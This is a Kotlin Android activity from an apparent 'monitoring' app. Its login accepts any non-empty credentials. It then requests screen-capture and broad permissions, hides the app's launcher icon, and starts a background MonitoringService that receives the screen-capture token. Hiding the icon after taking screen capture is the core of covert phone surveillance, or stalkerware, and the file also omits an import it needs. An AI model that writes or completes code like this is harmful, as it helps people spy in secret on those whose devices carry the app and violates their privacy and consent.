package com.example.advancedmonitor.ui

import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import com.example.advancedmonitor.databinding.ActivityLoginBinding
import com.example.advancedmonitor.services.MonitoringService
import com.example.advancedmonitor.utils.PermissionManager

class LoginActivity : AppCompatActivity() {

    private lateinit var binding: ActivityLoginBinding
    private val permissionManager = PermissionManager(this)
    private var mediaProjectionIntent: Intent? = null

    private val mediaProjectionLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == RESULT_OK) {
            mediaProjectionIntent = result.data
            startMonitoring()
        } else {
            Toast.makeText(this, "Screen capture permission denied", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityLoginBinding.inflate(layoutInflater)
        setContentView(binding.root)

        binding.btnLogin.setOnClickListener {
            val username = binding.etUsername.text.toString()
            val password = binding.etPassword.text.toString()
            
            if (validateCredentials(username, password)) {
                requestScreenCapturePermission()
            } else {
                Toast.makeText(this, "Invalid credentials", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun validateCredentials(username: String, password: String): Boolean {
        return username.isNotEmpty() && password.isNotEmpty()
    }

    private fun requestScreenCapturePermission() {
        val mediaProjectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjectionLauncher.launch(mediaProjectionManager.createScreenCaptureIntent())
    }

    private fun startMonitoring() {
        permissionManager.requestAllPermissions { allGranted ->
            if (allGranted) {
                hideAppIcon()
                startServices()
                saveMonitoringState()
                finish()
            } else {
                Toast.makeText(this, "Required permissions not granted", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun hideAppIcon() {
        val component = ComponentName(this, LoginActivity::class.java)
        packageManager.setComponentEnabledSetting(
            component,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    private fun startServices() {
        // Start monitoring service
        val serviceIntent = Intent(this, MonitoringService::class.java)
        mediaProjectionIntent?.let {
            serviceIntent.putExtra("media_projection", it)
        }
        startService(serviceIntent)
    }

    private fun saveMonitoringState() {
        getSharedPreferences("MonitorPrefs", MODE_PRIVATE).edit()
            .putBoolean("is_monitoring", true)
            .apply()
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PermissionManager.PERMISSION_REQUEST_CODE) {
            if (permissionManager.handlePermissionResult(grantResults)) {
                startMonitoring()
            } else {
                Toast.makeText(this, "Required permissions not granted", Toast.LENGTH_SHORT).show()
            }
        }
    }
}
